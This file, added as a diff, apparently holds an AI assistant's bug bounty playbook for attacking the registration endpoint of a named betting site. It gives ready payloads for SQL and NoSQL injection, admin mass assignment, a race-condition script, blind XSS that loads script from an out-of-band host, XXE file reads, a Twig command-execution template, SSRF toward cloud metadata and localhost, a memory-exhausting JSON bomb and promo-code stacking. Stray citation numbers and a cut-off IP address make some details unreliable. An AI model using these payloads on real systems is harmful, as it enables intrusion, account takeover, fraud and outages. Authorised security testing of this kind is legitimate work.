@@ -1,0 +1,256 @@
+Here is the complete Registration Endpoint Testing Playbook designed to maximize payouts under the program’s severity framework. This outlines the targets, tools, exact payloads, execution steps, and verification criteria for every known technical, business logic, and input handling attack vector affecting registration functionalities, mapped to their specific bug bounty rewards.
+------------------------------
+## 🛠️ Phase 0: Setup and Global Limits (Pre-Hunting)
+To ensure compliance with the program’s strict rate limits across all automated and manual tools combined:
+
+   1. Open Burp Suite's global settings and navigate to Tools -> HTTP -> Handling.
+   2. Check Set maximum concurrent requests and change the value to 5.
+   3. Check Delay between requests (ms) and set it to 200 (ensuring exactly 5 requests/sec max across all tools).
+
+------------------------------
+## 1️⃣ Test Way 1: SQL Injection (SQLi) via Registration Parameters
+This attempts to break the database query logic during account creation to read information from the database or execute arbitrary commands. [1] 
+
+* 🎯 Target Parameters: username, email, phone, promo_code. [2] 
+* 📋 Step-by-Step Execution:
+1. Open Burp Suite and capture a standard account registration request to https://1win.com.
+   2. Send the request to Burp Repeater.
+   3. Inject logical SQL breaking characters into the registration input fields. [3, 4] 
+* 💉 Payloads:
+* Time-Based Blind SQLi: 'XOR(if(now()=sysdate(),sleep(5),0))XOR'
+   * Error-Based SQLi: ' OR EXTRACTVALUE(1, CONCAT(0x7e, (SELECT @@version)))-- [5] 
+* 🔍 Response Verification Criteria: Hit Send. A vulnerability is confirmed if the response delays significantly (matching your sleep duration) or returns a database system error containing sensitive server data. [6, 7] 
+* 💰 Policy Match / Reward: Injections (SQLi or equivalent) — $1,500 USD (Critical Severity)
+
+------------------------------
+## 2️⃣ Test Way 2: Mass Parameter Assignment (Privilege Escalation at Registration)
+This checks if passing administrative privilege variables inside the initial sign-up payload payload array automatically maps them to your new user profile.
+
+* 🎯 Target Parameters: Entire JSON request body object.
+* 📋 Step-by-Step Execution:
+1. Capture a valid registration request in Burp Repeater.
+   2. Inject administrative key-value indicators straight into the structural object layer alongside your normal registration fields. [8, 9] 
+* 💉 Payloads:
+
+{
+  "username": "attacker_test",
+  "password": "Password123!",
+  "email": "test@h1.alias",
+  "role": "admin",
+  "is_admin": true,
+  "isAdmin": 1,
+  "privileges": ["superuser", "operator"],
+  "tier": "vip"
+}
+
+* 🔍 Response Verification Criteria: Review the server's response fields and cookies. A vulnerability is confirmed if the account is successfully created and the response profile or dashboard grants you elevated permissions or access to an administrative support layout. [10] 
+* 💰 Policy Match / Reward: Admin / support interface authentication bypass — $1,500 USD (Critical Severity)
+
+------------------------------
+## 3️⃣ Test Way 3: Registration Race Condition (Account / Balance Duplication)
+This checks if sending multiple identical registration requests simultaneously breaks the database's handling of unique constraints, leading to duplicate accounts or double-credited referral bonuses. [11] 
+
+* 🎯 Target Parameters: Entire registration request.
+* 📋 Step-by-Step Execution:
+1. Send your registration request from HTTP History to Turbo Intruder.
+   2. Configure a Python script using the concurrentRequestGate() mechanism to fire exactly 5 requests simultaneously (abiding by the program limit). [12] 
+* 💉 Turbo Intruder Engine Configuration:
+
+def queueRequests(target, wordlist):
+    engine = RequestEngine(endpoint=target.endpoint,
+                           concurrentConnections=5,
+                           requestsPerConnection=1,
+                           pipeline=False)
+    gate = engine.gate()
+    for i in range(5):
+        engine.queue(target.req, gate=gate)
+    engine.openGate(gate)
+
+* 🔍 Response Verification Criteria: Click Attack. A vulnerability is confirmed if multiple requests return an HTTP 200 OK or account creation confirmation. Check the database profile to see if multiple distinct user IDs were mapped to the exact same email address, or if a single referral code paid out multiple bonuses. [13] 
+* 💰 Policy Match / Reward: Financial business-logic bypass with quantifiable gain — $200–$400 USD (Medium Severity) (Can rise to $1,500–$2,500 if it results in massive unauthorized balance crediting).
+
+------------------------------
+## 4️⃣ Test Way 4: Stored Cross-Site Scripting (XSS) via Registration Fields
+This checks if malicious scripts injected into fields like your name or profile moniker during sign-up are rendered unsanitized in internal management panels seen by company employees.
+
+* 🎯 Target Parameters: first_name, last_name, username, nickname. [14] 
+* 📋 Step-by-Step Execution:
+1. Input standard script-breaking payloads into the registration text fields.
+   2. Submit the form.
+* 💉 Payloads:
+* Blind Admin XSS (Using your Interactsh/OAST address from Phase 0):
+   
+   "><script src="http://oast.pro"></script>
+   
+   * HTML Breakout:
+   
+   <img src=x onerror=alert(document.domain)>
+   
+   [15] 
+* 🔍 Response Verification Criteria: Keep your Interactsh terminal listener open. If an internal security analyst or administrator reviews your new user profile in their support backend, and their browser triggers a callback to your out-of-band listener, the bug is confirmed.
+* 💰 Policy Match / Reward: Admin / support interface blind XSS — $1,500 USD (High Severity) (Regular XSS pays $150 USD). [16] 
+
+------------------------------
+## 5️⃣ Test Way 5: XML External Entity (XXE) via Structured Registration Formats
+If the registration endpoint processes or accepts alternative data types like XML or custom documents, this checks if forcing format adjustments exposes the server to local file enumeration.
+
+* 🎯 Target Parameters: Content-Type Header and Request Body.
+* 📋 Step-by-Step Execution:
+1. Capture a JSON registration request in Burp Repeater.
+   2. Change the header line to Content-Type: application/xml.
+   3. Replace the request body entirely with a structured XML data object carrying an external system read entity payload. [17, 18] 
+* 💉 Payloads:
+
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE register [  
+  <!ENTITY xxe SYSTEM "file:///etc/hostname"> 
+]>
+<registrationRequest>
+  <username>&xxe;</username>
+  <password>TestPassword123!</password>
+  <email>test@h1.alias</email>
+</registrationRequest>
+
+* 🔍 Response Verification Criteria: Hit Send. If the application accepts the XML schema and successfully creates the account, check the response or verification email. If the server prints its internal system hostname instead of a standard username, a critical input handling error is present. [19] 
+* 💰 Policy Match / Reward: Local file access / manipulation (LFR, RFI, XXE) — $1,200 USD (Critical Severity)
+
+------------------------------
+## 6️⃣ Test Way 6: NoSQL Injection (Registration Parameter Manipulation)
+If the backend application relies on a NoSQL database structure (like MongoDB) to index and verify unique users, this replaces flat string fields with structured logical condition arrays to disrupt validation logic.
+
+* 🎯 Target Parameters: email, username.
+* 📋 Step-by-Step Execution:
+1. Intercept a standard JSON registration payload in Burp Suite Proxy.
+   2. Modify the JSON schema structure by introducing NoSQL conditional modifiers into the fields.
+* 💉 Payloads:
+
+{
+  "username": "new_user_88",
+  "password": "Password123!",
+  "email": {"$ne": "existing_user@1win.com"}
+}
+
+* 🔍 Response Verification Criteria: Hit Send. If the server evaluates the conditional logic array instead of processing the entry as a strict string literal value, it can result in a database bypass or allow the account to overwrite or attach itself to an existing user's indexing scope. [20] 
+* 💰 Policy Match / Reward: Injections (SQLi or equivalent) — $1,500 USD (Critical Severity) [21] 
+
+------------------------------
+## 7️⃣ Test Way 7: Server-Side Template Injection (SSTI) via Registration Names
+This tests if input fields entered during account creation are directly integrated unsanitized into the HTML welcome email templates dispatched dynamically upon completion. [22] 
+
+* 🎯 Target Parameters: first_name, last_name, username.
+* 📋 Step-by-Step Execution:
+1. Register a test account and inject mathematical evaluation array expressions into your user parameters.
+   2. Submit the form, then open your email inbox and view the incoming welcome email message.
+* 💉 Payloads:
+* Generic Engine Test: {{7*7}}
+   * Twig Engine Variant: {{_self.env.registerUndefinedFilterCallback('exec')}}{{_self.env.getFilter('id')}}
+* 🔍 Response Verification Criteria: Open the incoming email. If the template system renders the product of your math array (printing 49 instead of literal text string {{7*7}}), SSTI is confirmed. If it executes command strings, you have achieved Remote Code Execution (RCE).
+* 💰 Policy Match / Reward: Remote code execution (RCE) — $3,000 USD (Critical Severity) (Pure SSTI falls under High/Critical depending on impact). [23, 24] 
+
+------------------------------
+## 8️⃣ Test Way 8: Email Normalization & Flawed Validation Bypasses
+This tests if the registration system uses flawed string comparison filters that allow you to register variations of a victim's email address to intercept data or force account link mapping issues.
+
+* 🎯 Target Parameters: email.
+* 📋 Step-by-Step Execution:
+1. Identify your target victim account email context (e.g., victim@1win.com).
+   2. Try to register a duplicate account by adding specialized characters or alternate padding strings to the email. [25] 
+* 💉 Payloads:
+* Unicode Case Mapping: vIctim@1win.com (Checks if case conversion collisions occur down the pipeline)
+   * Null Byte Injection: victim@1win.com%00@attacker.com
+   * Trailing Whitespace Padding: victim@1win.com 
+* 🔍 Response Verification Criteria: A vulnerability is confirmed if the system treats the input as a unique profile string during creation, but downstream processes normalize the string and link it to the victim's existing account index, desynchronizing security properties.
+* 💰 Policy Match / Reward: Account takeover — $1,500 USD (High Severity)
+
+------------------------------
+If you are ready to prepare a report for one of these findings or need assistance with another scope segment, let me know:
+
+* Have you discovered a specific behavior change (like an HTTP 500 Internal Error or unique response length) when running any of these templates?
+* Would you like a custom Markdown report template to structure your final submission layout?
+
+
+To finalize your playbook, here are the remaining four advanced edge-case attack vectors that complete every technically possible variation for testing a registration endpoint. These target specific data structure desynchronizations, boundary parsing limits, and microservice validation gaps, mapped directly to their bug bounty rewards.
+------------------------------
+## 9️⃣ Test Way 9: Server-Side Request Forgery (SSRF) via Registration Webhooks/Avatars
+If the registration form allows users to link an external profile avatar URL, register an external OAuth callback destination, or provide an automated feed URL during account setup, this checks if the server attempts to connect inward to internal infrastructure layout endpoints.
+
+* 🎯 Target Parameters: avatar_url, webhook_url, profile_image_link.
+* 📋 Step-by-Step Execution:
+1. Open the registration dashboard and find any fields requesting an external image source link or URL.
+   2. Input an internal network string target or your private Interactsh domain wrapper.
+* 💉 Payloads:
+* Cloud Infrastructure Target: http://169.254.169
+   * Local Infrastructure Port Scan: http://127.0.0.1:8080
+   * Out-of-Band Verification: http://oast.pro [1, 2] 
+* 🔍 Response Verification Criteria: Review your running OOB listener or check the application's output response body. If the application server successfully fetches the resource and returns local infrastructure signatures (like cloud access keys or local port error data), SSRF is confirmed. [3] 
+* 💰 Policy Match / Reward:
+* SSRF, non-blind (readable response) — $1,300 USD (High Severity)
+   * SSRF, blind — $750 USD (High Severity) [4, 5] 
+
+------------------------------
+## 🔟 Test Way 10: Identifier Injection via Type Juggling / Type Confusion
+This checks if the registration API's input validator can be confused by swapping expected flat string parameters for alternate data arrays or boolean representations, tricking the server into assigning auto-generated administrative indexes to the profile.
+
+* 🎯 Target Parameters: user_id, account_type, registration_flags.
+* 📋 Step-by-Step Execution:
+1. Capture a JSON registration request in Burp Repeater.
+   2. Locate structural fields that specify profile characteristics and rewrite them using alternate integer types or logical arrays.
+* 💉 Payloads:
+* Boolean Type Swap: {"username": "test_user", "is_vip": true}
+   * Array Parameter Confusion: {"account_type": ["user", "admin"]}
+   * Integer Boundary Inversion: {"user_id": 0} or {"user_id": -1}
+* 🔍 Response Verification Criteria: A vulnerability is present if the backend script processes the altered data format without strict typing errors, resulting in the registration of an account that automatically inherits structural system properties or overrides locked database rows.
+* 💰 Policy Match / Reward: Admin / support interface authentication bypass — $1,500 USD (Critical Severity)
+
+------------------------------
+## 1️⃣1️⃣ Test Way 11: Application Memory/Buffer Inflation (JSON Data Bomb)
+This checks if the registration endpoint lacks parsing length constraints on its standard user-supplied text properties, allowing an attacker to exhaust backend system memory capacities during account creation.
+
+* 🎯 Target Parameters: username, first_name, biography, custom_notes.
+* 📋 Step-by-Step Execution:
+1. Capture your registration payload inside Burp Repeater.
+   2. Use a local utility tool to generate a text string containing millions of repetitive characters.
+   3. Paste this massive block into one of the registration text parameter strings and click Send.
+* 💉 Payloads:
+
+{
+  "username": "test_user",
+  "password": "Password123!",
+  "custom_notes": "A[...REPEAT 'A' 5,000,000 TIMES...]"
+}
+
+[6] 
+* 🔍 Response Verification Criteria: Monitor the server's output properties. If the endpoint responds with a lengthy processing delay, crashes with an HTTP 500 Internal Server Error, or temporarily slows down downstream lookups, a data parsing vulnerability is present. [7] 
+* ⚠️ Strict Bounty Rule Note: The program explicitly bans standard volumetric Denial of Service (DoS/DDoS) attacks. However, identifying a single request resource exhaustion logic flaw via structural code parsing bugs is valid, provided you stay within the 5 requests per second automated threshold rule.
+* 💰 Policy Match / Reward: Financial business-logic bypass / Platform Input Handling Defects — $200–$400 USD (Medium Severity) [8] 
+
+------------------------------
+## 1️⃣2️⃣ Test Way 12: Business Logic Affiliate/Referral Multi-Voucher Stacking
+This targets registration procedures tied directly to sign-up promotions, checking if an attacker can manipulate parameters to stack multiple initial voucher identifiers onto a single profile before the creation logic saves changes to the master data tables.
+
+* 🎯 Target Parameters: promo_code, voucher_id, referral_token.
+* 📋 Step-by-Step Execution:
+1. Intercept your sign-up HTTP POST body string using Burp Proxy.
+   2. Find the singular promo code parameter line. Duplicate the argument using structured notation array markers to verify multi-assignment validation paths.
+* 💉 Payloads:
+* JSON Multi-Code Stacking Array:
+   
+   {
+     "username": "promo_hunter",
+     "password": "Password123!",
+     "promo_code": ["WELCOME100", "FREEWAGER50", "CASINOBONUS"]
+   }
+   
+   * HPP Registration String Format: username=test&password=pass&promo_code=BONUS1&promo_code=BONUS2
+* 🔍 Response Verification Criteria: Complete the sign-up sequence and log directly into the new dashboard interface profile wallet view. A business logic vulnerability is confirmed if the wallet balance displays stacked, combined currency increments from all supplied promotional keys simultaneously.
+* 💰 Policy Match / Reward: Financial business-logic bypass with quantifiable gain — $200–$400 USD (Medium Severity) (Can rise to $1,500–$2,500 Critical Severity if the logic allows you to bypass payment requirements or generate unauthorized balance credits).
+
+------------------------------
+This officially concludes every technically documented attack vector targeting authentication, registration, login, logout, and password reset functionalities within the scope of security testing.
+If you are ready to proceed with formatting a submission, let me know:
+
+* Which vulnerability category you want to focus on validating first.
+* If you need help structuring your Reproduction Steps or Proof of Concept sections into a highly professional format to prevent triage delays.
+
+
+
